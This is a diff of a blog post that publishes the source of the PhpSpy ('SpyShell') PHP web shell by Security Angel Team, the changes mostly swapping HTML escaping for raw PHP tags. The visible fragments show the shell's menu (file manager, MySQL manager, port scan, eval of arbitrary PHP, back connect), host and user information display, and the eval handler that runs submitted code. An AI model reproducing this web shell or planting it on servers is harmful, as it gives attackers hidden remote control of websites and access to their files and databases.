@@ -16,7 +16,7 @@ SpyShell Script, powered by Security Angel Team [S4T].
 
 ### SpyShell Script Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 error_reporting(7);
 @set_magic_quotes_runtime(0);
 ob_start();
@@ -178,11 +178,11 @@ if($doing=='mysqldown'){
 	}
 }
 
-?&gt;
+?>
 &lt;html&gt;
 &lt;head&gt;
 &lt;meta http-equiv="Content-Type" content="text/html; charset=gbk"&gt;
-&lt;title&gt;&lt;?php echo $action.' - '.$_SERVER['HTTP_HOST'];?&gt;&lt;/title&gt;
+&lt;title&gt;<?php echo $action.' - '.$_SERVER['HTTP_HOST'];?>&lt;/title&gt;
 &lt;style type="text/css"&gt;
 body,td{font: 12px Arial,Tahoma;line-height: 16px;}
 .input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
@@ -321,7 +321,7 @@ function g(action,nowpath,p1,p2,p3,p4,p5) {
 &lt;/script&gt;
 &lt;/head&gt;
 &lt;body style="margin:0;table-layout:fixed; word-break:break-all"&gt;
-&lt;?php
+<?php
 formhead(array('name'=&gt;'opform'));
 makehide('action', $action);
 makehide('nowpath', $nowpath);
@@ -346,14 +346,14 @@ if(!function_exists('posix_getegid')) {
 	$gid = $gid['gid'];
 }
 
-?&gt;
+?>
 &lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;
 	&lt;tr class="head"&gt;
-		&lt;td&gt;&lt;span style="float:right;"&gt;&lt;?php echo @php_uname();?&gt; / User:&lt;?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?&gt;&lt;/span&gt;&lt;?php echo $_SERVER['HTTP_HOST'];?&gt; (&lt;?php echo gethostbyname($_SERVER['SERVER_NAME']);?&gt;)&lt;/td&gt;
+		&lt;td&gt;&lt;span style="float:right;"&gt;<?php echo @php_uname();?> / User:<?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?>&lt;/span&gt;<?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)&lt;/td&gt;
 	&lt;/tr&gt;
 	&lt;tr class="alt1"&gt;
 		&lt;td&gt;
-			&lt;span style="float:right;"&gt;PHP &lt;?php echo PHP_VERSION;?&gt; / Safe Mode:&lt;?php echo getcfg('safe_mode');?&gt;&lt;/span&gt;
+			&lt;span style="float:right;"&gt;PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?>&lt;/span&gt;
 			&lt;a href="javascript:g('logout');"&gt;Logout&lt;/a&gt; | 
 			&lt;a href="javascript:g('file');"&gt;File Manager&lt;/a&gt; | 
 			&lt;a href="javascript:g('mysqladmin');"&gt;MYSQL Manager&lt;/a&gt; | 
@@ -363,12 +363,12 @@ if(!function_exists('posix_getegid')) {
 			&lt;a href="javascript:g('portscan');"&gt;Port Scan&lt;/a&gt; | 
 			&lt;a href="javascript:g('secinfo');"&gt;Security information&lt;/a&gt; | 
 			&lt;a href="javascript:g('eval');"&gt;Eval PHP Code&lt;/a&gt;
-			&lt;?php if (!IS_WIN) {?&gt; | &lt;a href="javascript:g('backconnect');"&gt;Back Connect&lt;/a&gt;&lt;?php }?&gt;
+			<?php if (!IS_WIN) {?> | &lt;a href="javascript:g('backconnect');"&gt;Back Connect&lt;/a&gt;<?php }?>
 		&lt;/td&gt;
 	&lt;/tr&gt;
 &lt;/table&gt;
 &lt;table width="100%" border="0" cellpadding="15" cellspacing="0"&gt;&lt;tr&gt;&lt;td&gt;
-&lt;?php
+<?php
 $errmsg && m($errmsg);
 
 // »ñÈ¡µ±Ç°Â·¾¶
@@ -531,7 +531,7 @@ if ($action == 'file') {
 		$cwd_links .= '\');"&gt;'.$path[$i].'/&lt;/a&gt;';
 	}
 
-?&gt;
+?>
 &lt;script type="text/javascript"&gt;
 document.onclick = shownav;
 function shownav(e){
@@ -556,20 +556,20 @@ function shownav(e){
 &lt;div style="background:#eee;margin-bottom:10px;"&gt;
 	&lt;table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0"&gt;
 		&lt;tr&gt;
-			&lt;td width="100%"&gt;&lt;?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?&gt; (&lt;?php echo $dir_writeable;?&gt;)&lt;/td&gt;
+			&lt;td width="100%"&gt;<?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir_writeable;?>)&lt;/td&gt;
 			&lt;td nowrap&gt;&lt;input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"&gt;&lt;/td&gt;
 		&lt;/tr&gt;
 	&lt;/table&gt;
 	&lt;table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;"&gt;
 	&lt;form action="" method="post" id="godir" name="godir"&gt;
 		&lt;tr&gt;
-			&lt;td nowrap&gt;Current Directory (&lt;?php echo $dir_writeable;?&gt;, &lt;?php echo getChmod($nowpath);?&gt;)&lt;/td&gt;
-			&lt;td width="100%"&gt;&lt;input name="view_writable" value="0" type="hidden" /&gt;&lt;input class="input" name="dir" value="&lt;?php echo $nowpath;?&gt;" type="text" style="width:99%;margin:0 8px;"&gt;&lt;/td&gt;
+			&lt;td nowrap&gt;Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)&lt;/td&gt;
+			&lt;td width="100%"&gt;&lt;input name="view_writable" value="0" type="hidden" /&gt;&lt;input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:99%;margin:0 8px;"&gt;&lt;/td&gt;
 			&lt;td nowrap&gt;&lt;input class="bt" value="GO" type="submit"&gt;&lt;/td&gt;
 		&lt;/tr&gt;
 	&lt;/form&gt;
 	&lt;/table&gt;
-&lt;?php
+<?php
 	if (IS_WIN && IS_COM) {
 		$obj = new COM('scripting.filesystemobject');
 		if ($obj && is_object($obj) && $obj-&gt;Drives) {
@@ -585,9 +585,9 @@ function shownav(e){
 			echo '&lt;/div&gt;';
 		}
 	}
-?&gt;
+?>
 &lt;/div&gt;
-&lt;?php
+<?php
 	$findstr = $_POST['findstr'];
 	$re = $_POST['re'];
 	tbhead();
@@ -737,7 +737,7 @@ elseif ($action == 'sqlfile') {
 			}
 		}
 	}
-?&gt;
+?>
 &lt;script type="text/javascript"&gt;
 function mysqlfile(doing){
 	if(!doing) return;
@@ -751,7 +751,7 @@ function mysqlfile(doing){
 	$('mysqlfile').submit();
 }
 &lt;/script&gt;
-&lt;?php
+<?php
 	!$dbhost && $dbhost = 'localhost';
 	!$dbuser && $dbuser = 'root';
 	!$dbport && $dbport = '3306';
@@ -1350,9 +1350,9 @@ elseif ($action == 'eval') {
 	$phpcode = trim($phpcode);
 	if($phpcode){
 		if (!preg_match('#&lt;\?#si', $phpcode)) {
-			$phpcode = "&lt;?php\n\n{$phpcode}\n\n?&gt;";
+			$phpcode = "<?php\n\n{$phpcode}\n\n?>";
 		}
-		eval("?"."&gt;$phpcode&lt;?");
+		eval("?"."&gt;$phpcode<?");
 	}
 	formhead(array('title'=&gt;'Eval PHP Code'));
 	makehide('action','eval');
@@ -1590,16 +1590,16 @@ else {
 	m('Undefined Action');
 }
 
-?&gt;
+?>
 &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;"&gt;
-	&lt;span style="float:right;"&gt;&lt;?php debuginfo();ob_end_flush();?&gt;&lt;/span&gt;
-	Powered by &lt;a title="Build 20110502" href="http://www.4ngel.net" target="_blank"&gt;&lt;?php echo str_replace('.','','P.h.p.S.p.y');?&gt; 2011&lt;/a&gt;. Copyright (C) 2004-2011 &lt;a href="http://www.4ngel.net" target="_blank"&gt;Security Angel Team [S4T]&lt;/a&gt; All Rights Reserved.
+	&lt;span style="float:right;"&gt;<?php debuginfo();ob_end_flush();?>&lt;/span&gt;
+	Powered by &lt;a title="Build 20110502" href="http://www.4ngel.net" target="_blank"&gt;<?php echo str_replace('.','','P.h.p.S.p.y');?> 2011&lt;/a&gt;. Copyright (C) 2004-2011 &lt;a href="http://www.4ngel.net" target="_blank"&gt;Security Angel Team [S4T]&lt;/a&gt; All Rights Reserved.
 &lt;/div&gt;
 &lt;/body&gt;
 &lt;/html&gt;
 
-&lt;?php
+<?php
 
 /*======================================================
 º¯Êý¿â
@@ -1666,7 +1666,7 @@ function multi($num, $perpage, $curpage, $tablename) {
 }
 // µÇÂ½Èë¿Ú
 function loginpage() {
-?&gt;
+?>
 	&lt;style type="text/css"&gt;
 	input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
 	&lt;/style&gt;
@@ -1675,7 +1675,7 @@ function loginpage() {
 	&lt;input type="hidden" name="action" value="login"&gt;
 	&lt;input type="submit" value="Login"&gt;
 	&lt;/form&gt;
-&lt;?php
+<?php
 	exit;
 }//end loginpage()
 
@@ -2159,8 +2159,8 @@ function pr($s){
 	echo "&lt;pre&gt;".print_r($s).'&lt;/pre&gt;';
 }
 
-?&gt;
-</pre>
+?>
+{% endhighlight %}
 
 ### Spyshell Script screenshot<figure id="attachment_432" style="width: 604px;" class="wp-caption aligncenter">
 
